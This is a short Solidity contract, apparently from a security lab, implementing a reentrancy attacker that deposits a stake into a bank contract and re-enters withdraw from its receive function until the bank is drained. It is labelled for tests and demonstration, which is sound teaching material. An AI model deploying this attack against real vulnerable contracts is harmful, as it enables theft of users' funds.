// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IBank} from "../../src/IBank.sol";

/// @notice Attacker contract for the lab. For tests and demonstration only.
/// @dev Deposits a small stake, withdraws it, and every time the bank sends ETH, the `receive`
///      function calls `withdraw` again while the bank still holds enough ETH.
contract ReentrancyAttacker {
    IBank public immutable bank;
    uint256 public stake;

    constructor(IBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        require(msg.value > 0, "send some ETH");
        stake = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    /// @dev Runs every time the bank sends us ETH. This is where the re-entry happens.
    receive() external payable {
        if (address(bank).balance >= stake) {
            bank.withdraw();
        }
    }
}
